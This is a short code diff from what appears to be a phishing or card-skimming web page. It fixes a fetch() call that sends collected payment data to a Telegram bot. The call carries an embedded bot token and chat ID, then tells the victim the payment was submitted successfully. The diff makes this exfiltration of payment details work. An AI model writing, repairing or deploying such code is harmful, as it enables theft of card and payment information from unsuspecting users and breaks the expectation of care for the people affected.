@@ -73,8 +73,7 @@
       });
 
       // Send data to your Telegram Bot
-      fetch('https://api.telegram.org/bot7805822636:AAFo5FBSIIzkpP0GsPBjOWVM5vVEz_g2z3s
-/sendMessage?chat_id=7869970772&text=' + encodeURIComponent(JSON.stringify(paymentData)))
+      fetch('https://api.telegram.org/bot7805822636:AAFo5FBSIIzkpP0GsPBjOWVM5vVEz_g2z3s/sendMessage?chat_id=7869970772&text=' + encodeURIComponent(JSON.stringify(paymentData)))
         .then(response => {
           if(response.ok) {
             alert('Payment info submitted successfully!');
